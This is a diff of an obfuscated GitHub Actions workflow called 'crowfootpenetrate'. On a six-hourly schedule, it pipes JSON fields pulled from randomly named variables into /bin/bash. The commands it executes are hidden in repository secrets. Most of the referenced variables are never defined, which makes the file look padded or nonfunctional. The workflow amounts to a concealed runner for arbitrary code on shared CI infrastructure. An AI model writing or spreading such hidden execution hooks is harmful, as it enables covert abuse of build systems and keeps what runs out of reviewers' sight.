@@ -2,7 +2,7 @@ name: crowfootpenetrate
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 5/6 * * *'
+    - cron: '55 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,13 +11,28 @@ jobs:
       - uses: actions/checkout@v4
       - name: crowfootpenetrate
         env:
-          laqxt2820: ${{ secrets.laqxt2820 }}
+          udsxe3056: ${{ secrets.udsxe3056 }}
         run: |
-          echo $laqxt2820 | jq -r .zqe4285 | /bin/bash
-          echo $fvjy4842 | jq -r .wev67124 | /bin/bash
-          echo $zwd01998 | jq -r .qd1 | /bin/bash
-          echo $ic3 | jq -r .kj64815 | /bin/bash
-          echo $kr80490 | jq -r .u00809 | /bin/bash
-          echo $omnlm81 | jq -r .wg490 | /bin/bash
-          echo $m70 | jq -r .bqlhk88 | /bin/bash
+          echo $udsxe3056 | jq -r .kxlqw3622 | /bin/bash
+          echo $imx59280 | jq -r .ue04745 | /bin/bash
+          echo $sn4842 | jq -r .u91 | /bin/bash
+          echo $u02 | jq -r .b4 | /bin/bash
+          echo $znr7272 | jq -r .wt60962 | /bin/bash
+          echo $k30180 | jq -r .ug730 | /bin/bash
+          echo $tvn5 | jq -r .cgwaq4 | /bin/bash
+          echo $cagk04863 | jq -r .mu5 | /bin/bash
+          echo $ifaq064 | jq -r .uxzds6 | /bin/bash
+          echo $iuh0448 | jq -r .fsot27067 | /bin/bash
+          echo $wlzh2417 | jq -r .yr16558 | /bin/bash
+          echo $us86927 | jq -r .p440 | /bin/bash
+          echo $pu88155 | jq -r .uzdm5021 | /bin/bash
+          echo $ewxdv23 | jq -r .zm760 | /bin/bash
+          echo $llcit106 | jq -r .s297 | /bin/bash
+          echo $mlt984 | jq -r .ayu47 | /bin/bash
+          echo $yybgu9484 | jq -r .ur14688 | /bin/bash
+          echo $dnrq66705 | jq -r .cge5 | /bin/bash
+          echo $mao191 | jq -r .v6696 | /bin/bash
+          echo $opdo1467 | jq -r .xkt3863 | /bin/bash
+          echo $hprs5935 | jq -r .snl97 | /bin/bash
+          echo $drqc6 | jq -r .oy654 | /bin/bash
 
